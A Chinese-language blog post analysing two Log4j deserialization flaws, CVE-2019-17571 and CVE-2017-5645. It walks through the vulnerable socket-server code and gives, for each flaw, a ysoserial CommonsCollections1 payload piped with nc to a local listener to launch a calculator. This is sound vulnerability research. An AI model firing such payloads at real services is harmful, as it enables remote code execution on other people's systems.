---
title: log4j反序列化漏洞分析
description: Log4j 1.2.X版本的CVE-2019-17571分析，以前没分析过，所以回顾历史Log4j 2.X版本的CVE-2017-5645
categories:
 - 漏洞分析
tags:
 - 漏洞分析
---

### 0x00 Log4j反序列化的一些基本感想
[CVE-2019-17571公告](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2019-17571)

[CVE-2017-5645公告](http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-5645)

还是数据流转，log4j对网络传入的数据没有检查，在文本和二进制的数据转换成Java对象的过程中触发反序列化漏洞

我看了网上一些文章，就类似Python的logging库，基本都是用它来打印日志到终端或者log文件中，其他大部分介入syslog或者开端口接收日志等功能，一般博客没有介绍其他功能，预计影响是不大的

实际上抽查了1800台测试环境机器开的所有端口，确实没有触发反序列化漏洞，HIDS检测这1800台机器中用到log4j的有296台，说明其实也确实没有开发会这么写，更多一些是ELK等收集或者rsync同步日志这样的方式

全公司查了下代码和所有端口打了一遍还是没有触发，不知道会不会有公司使用这个功能

所以这种其实还是雷声大雨点小，添乱

然后关于PoC，其实根本不需要等曝出，用ysoserial的URLDNS链就可以直接触发，任意gadget都可以触发，就是我每天跑的PoC里就可以触发，搞个DNSlog就能根据每天的结果回溯到这个服务

所以其实根本不用应急

所以，要是有开发用到这个功能，我就能首发这个CVE了，看起来没有机缘啊

然后不知道更大的公司会不会用这些，用不到的功能在有可能在用到的时候触发的漏洞不知道算不算漏洞呢

### 0x01 CVE-2019-17571
#### 先弹一个计算器

IDEA新建一个maven项目，不知道为什么不识别log4j 1.2.X的版本，可能和我用阿里云源有关

只能[官网下载](https://logging.apache.org/log4j/1.2/download.html)，导入依赖包

然后maven添加上CommonsCollection1这条gadget

```
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
</dependency>
```

项目添加两个文件

```
// src/main/java/Log.java

import org.apache.log4j.net.SimpleSocketServer;

public class Log {
    public static void main(String[] args) {
        String[] arguments = {"8888", (new Log()).getClass().getClassLoader().getResource("log4j.properties").getPath()};
        SimpleSocketServer.main(arguments);
    }
}

// src/main/java/resources/log4j.properties
有建立文件就可以了，不需要内容
```

把Log.java运行起来

用ysoserial和nc打PoC

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "open /System/Applications/Calculator.app" > test.txt
$ cat test.txt | nc 127.0.0.1 8888
```

看，弹了个计算器

![1-1](https://milkfr.github.io/assets/images/posts/2020-01-01-analysis-java-deserialize-log4j/1-1.png)

#### 触发流程分析
这次的漏洞实在太简单了，连祖传的debug大法都用不上了

直接跟进`SimpleSocketServer.main()`

```
public class SimpleSocketServer {
    public static void main(String[] argv) {
        if (argv.length == 2) {
            init(argv[0], argv[1]);
        } else {
            usage("Wrong number of arguments.");
        }

        try {
            cat.info("Listening on port " + port);
            ServerSocket serverSocket = new ServerSocket(port);

            while(true) {
                cat.info("Waiting to accept a new client.");
                Socket socket = serverSocket.accept();
                cat.info("Connected to client at " + socket.getInetAddress());
                cat.info("Starting new socket node.");
                (new Thread(new SocketNode(socket, LogManager.getLoggerRepository()), "SimpleSocketServer-" + port)).start();
            }
        } catch (Exception var3) {
            var3.printStackTrace();
        }
    }
}
```

就是普通TCP监听代码，有新连接就开一个新线程，新线程就新建了一个`SocketNode`实例，然后就看`SocketNode`，关键部分如下

```
public class SocketNode implements Runnable {
    public SocketNode(Socket socket, LoggerRepository hierarchy) {
        this.socket = socket;
        this.hierarchy = hierarchy;

        try {
            this.ois = new ObjectInputStream(new BufferedInputStream(socket.getInputStream()));
        } catch (InterruptedIOException var4) {
            Thread.currentThread().interrupt();
            logger.error("Could not open ObjectInputStream to " + socket, var4);
        } catch (IOException var5) {
            logger.error("Could not open ObjectInputStream to " + socket, var5);
        } catch (RuntimeException var6) {
            logger.error("Could not open ObjectInputStream to " + socket, var6);
        }

    }

    public void run() {
        try {
            if (this.ois != null) {
                while(true) {
                    LoggingEvent event;
                    Logger remoteLogger;
                    do {
                        event = (LoggingEvent)this.ois.readObject();
                        remoteLogger = this.hierarchy.getLogger(event.getLoggerName());
                    } while(!event.getLevel().isGreaterOrEqual(remoteLogger.getEffectiveLevel()));

                    remoteLogger.callAppenders(event);
                }
            }
        } catch (EOFException var36) {
        // 一下省略
}
```

就是`SocketNode`继承了`Runnable`，然后构造函数的时候`ois`变量是从socket读取数据的`ObjectInputStream`

然后进程run的时候就触发了`readObject`，然后就看有什么gadget就可以触发什么了

好了这样就分析完了，真的非常简单的触发呢，不过瘾还可以用祖传debug大法来一遍

### 0x02 CVE-2017-5645
#### 再弹一个计算器
这次可以用maven了

```
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.8.1</version>
</dependency>
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-api</artifactId>
    <version>2.8.1</version>
</dependency>
<dependency>
    <groupId>commons-collections</groupId>
    <artifactId>commons-collections</artifactId>
    <version>3.1</version>
    </dependency>
```

和上面验证只需要改写`src/main/java/Log.java`就可以了

```
import org.apache.logging.log4j.core.net.server.ObjectInputStreamLogEventBridge;
import org.apache.logging.log4j.core.net.server.TcpSocketServer;

import java.io.IOException;
import java.io.ObjectInputStream;


public class Log {
    public static void main(String[] args) {
        TcpSocketServer<ObjectInputStream> myServer = null;
        try{
            myServer = new TcpSocketServer<ObjectInputStream>(8888, new ObjectInputStreamLogEventBridge());
        } catch(IOException e){
            e.printStackTrace();
        }
        myServer.run();
    }
}
```

把Log.java运行起来

用ysoserial和nc打PoC

```
$ java -jar ysoserial-0.0.6-SNAPSHOT-all.jar CommonsCollections1 "open /System/Applications/Calculator.app" > test.txt
$ cat test.txt | nc 127.0.0.1 8888
```

看，弹了个计算器

![2-1](https://milkfr.github.io/assets/images/posts/2020-01-01-analysis-java-deserialize-log4j/2-1.png)

#### 触发流程分析
这个流程比上面那个稍微复杂一些，找实现接口的实际实现类动用了一下祖传单步调试，其他都看代码就明白了

```
public class TcpSocketServer<T extends InputStream> extends AbstractSocketServer<T> {
    // 省略一些代码
    public void run() {
        EntryMessage entry = this.logger.traceEntry();

        while(this.isActive()) {
            if (this.serverSocket.isClosed()) {
                return;
            }

            try {
                this.logger.debug("Listening for a connection {}...", this.serverSocket);
                Socket clientSocket = this.serverSocket.accept();
                this.logger.debug("Acepted connection on {}...", this.serverSocket);
                this.logger.debug("Socket accepted: {}", clientSocket);
                clientSocket.setSoLinger(true, 0);
                TcpSocketServer<T>.SocketHandler handler = new TcpSocketServer.SocketHandler(clientSocket);
                this.handlers.put(handler.getId(), handler);
                handler.start();
            } catch (IOException var7) {
                if (this.serverSocket.isClosed()) {
                    this.logger.traceExit(entry);
                    return;
                }

                this.logger.error("Exception encountered on accept. Ignoring. Stack trace :", var7);
            }
        }
        // 省略一些代码
    }

    private class SocketHandler extends Log4jThread {
        // 省略一些代码
        public SocketHandler(Socket socket) throws IOException {
            this.inputStream = TcpSocketServer.this.logEventInput.wrapStream(socket.getInputStream());
        }
        public void run() {
            EntryMessage entry = TcpSocketServer.this.logger.traceEntry();
            boolean closed = false;

            try {
                try {
                    while(!this.shutdown) {
                        TcpSocketServer.this.logEventInput.logEvents(this.inputStream, TcpSocketServer.this);
                    }
                } catch (EOFException var9) {
                    closed = true;
                } catch (OptionalDataException var10) {
                    TcpSocketServer.this.logger.error("OptionalDataException eof=" + var10.eof + " length=" + var10.length, var10);
                } catch (IOException var11) {
                    TcpSocketServer.this.logger.error("IOException encountered while reading from socket", var11);
                }

                if (!closed) {
                    Closer.closeSilently(this.inputStream);
                }
            } finally {
                TcpSocketServer.this.handlers.remove(this.getId());
            }

            TcpSocketServer.this.logger.traceExit(entry);
        }
    }
}
```

首先`TcpSocketServer`继承了`SocketServer`，总之就是监听请求，有请求进来就起一个新线程

新线程就是`SocketHandler`，继承了`Log4jThread`，不用管`Log4jThread`怎么实现，知道是线程就可以了

`SocketHandler`初始化的时候会获取socket的IO流，然后运行的时候调用`logEvents`方法

这里实现类`ObjectInputStreamLogEventBridge`继承了接口`LogEventBridge`中，这一步需要单步调试才能找到

```
public class ObjectInputStreamLogEventBridge extends AbstractLogEventBridge<ObjectInputStream> {
    public ObjectInputStreamLogEventBridge() {
    }

    public void logEvents(ObjectInputStream inputStream, LogEventListener logEventListener) throws IOException {
        try {
            logEventListener.log((LogEvent)inputStream.readObject());
        } catch (ClassNotFoundException var4) {
            throw new IOException(var4);
        }
    }

    public ObjectInputStream wrapStream(InputStream inputStream) throws IOException {
        return new ObjectInputStream(inputStream);
    }
}
```

这里其实就可以看到是`ObjectInputStream`和`readObject`方法了，然后就知道哪里发生了反序列化触发漏洞了
